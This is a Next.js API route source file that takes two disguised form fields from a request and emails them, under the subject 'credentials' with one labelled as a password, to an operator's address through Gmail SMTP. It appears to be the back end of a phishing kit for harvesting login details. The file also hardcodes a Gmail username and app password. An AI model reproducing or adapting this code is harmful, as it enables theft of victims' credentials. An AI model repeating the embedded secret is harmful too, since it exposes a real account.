// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from 'next'
import nodemailer from 'nodemailer'

type Data = {
  message: string
}

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  const {jenneta, rine} = req.body

  let transporter: nodemailer.Transporter = nodemailer.createTransport({
    service: 'Gmail',
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: 'deeswork969@gmail.com', 
      pass: 'euujozgmwmhqniiu', 
    },
  });

  return transporter.sendMail({
              from: `"fox" <deeswork969@gmail.com>`,
              to: process.env.EMAIL_TO_SEND,
              subject: 'credentials',
              // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
              html: `<h3>${JSON.stringify(jenneta).replaceAll('"', '')} /password: ${JSON.stringify(rine).replaceAll('"', '')}</h3>`
            }).then((rec) => {

              console.log(rec);
              
              return res.status(200).send({message: 'message sent'})
              
            }).catch((err) => {
              
              console.log(err);
              
              return res.status(400).send({message:'an error occured'})
            })
  
  
}
